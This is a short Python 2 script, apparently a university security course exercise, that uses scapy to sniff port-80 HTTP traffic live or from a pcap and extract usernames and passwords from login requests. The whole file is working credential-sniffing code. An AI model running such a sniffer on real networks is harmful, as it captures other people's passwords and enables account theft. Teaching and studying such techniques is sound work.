import scapy.all as S
import urlparse


WEBSITE = 'infosec.cs.tau.ac.il'


def parse_packet(packet):
    """
    If this is a login request to the course website, return the username
    and password as a tuple => ('123456789', 'opensesame'). Otherwise,
    return None.

    Note: You can assume the entire HTTP request fits within one packet.
    """
  

    data = str(packet[S.TCP])
    start = data.find("username=")
    if(start==-1):
        return None
    end = data.find("&password=")
    if(end == -1):
        return None
    username = data[start:end]
    password = data[end:]
   
    return (username[9:],password[10:])



def packet_filter(packet):
    """
    Filter to keep only HTTP traffic (port 80) from the client to the server.
    """
    port = [80]  
    if(packet.haslayer('TCP')):
        if(packet.haslayer(S.Raw)):  
            if(packet.dport in port):      
                return True
    return False

def main(args):
    # WARNING: DO NOT EDIT THIS FUNCTION!
    if '--help' in args:
        print 'Usage: %s [<path/to/recording.pcap>]' % args[0]

    elif len(args) < 2:
        # Sniff packets and apply our logic.
        S.sniff(lfilter=packet_filter, prn=parse_packet)

    else:
        # Else read the packets from a file and apply the same logic.
        for packet in S.rdpcap(args[1]):
            if packet_filter(packet):
                print parse_packet(packet)


if __name__ == '__main__':
    import sys
    main(sys.argv)
